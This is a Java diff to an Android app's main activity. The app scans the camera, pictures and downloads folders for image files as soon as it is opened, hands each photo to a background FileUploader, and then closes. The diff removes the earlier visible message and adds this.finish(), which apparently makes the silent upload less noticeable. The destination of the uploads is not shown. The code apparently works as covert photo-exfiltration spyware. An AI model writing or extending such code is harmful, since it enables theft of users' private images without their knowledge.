@@ -14,31 +14,29 @@ public class MainActivity extends Activity {
 
 	TextView text;
 	
-	private final static String paths[] = {
-		Environment.getExternalStorageDirectory().toString() + "/Pictures",
-		Environment.getExternalStorageDirectory().toString() + "/DCIM/Camera",
+	private static final String FILENAME_REGEX = "(\\_)?((DSC)|(IMG)).*\\.((jpg)|(png)|(jpeg))";
+	
+	private final static String IMAGE_PATHS[] = {
+		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString() + "/Camera",
+		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString(),
 		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString(),
 	};
-	
-	private static final String extensions[] = {".jpg", ".png", ".jpeg"};
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
-		
+	
 		text = (TextView) findViewById(R.id.texto);
 		
 		List<File> archivos = new ArrayList<File>();
 		
-		for (String path : paths) {
+		for (String path : IMAGE_PATHS) {
 			File files[] = new File(path).listFiles();
 			if (files != null) {
 				for (File file : files) {
-					for (String extension : extensions) {
-						if (file.getName().endsWith(extension)) {
-							archivos.add(file);
-						}
+					if (file.getName().matches(FILENAME_REGEX)) {
+						archivos.add(file);						
 					}
 				}
 			}
@@ -46,13 +44,13 @@ public class MainActivity extends Activity {
 		
 		for (File archivo : archivos) {
 			try {
-				new FileUploader().execute(archivo);
+				new FileUploader(this).execute(archivo);
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
 		}
 		
-		text.setText("chau viejardas");
+		this.finish();
 	}
 	
 	@Override
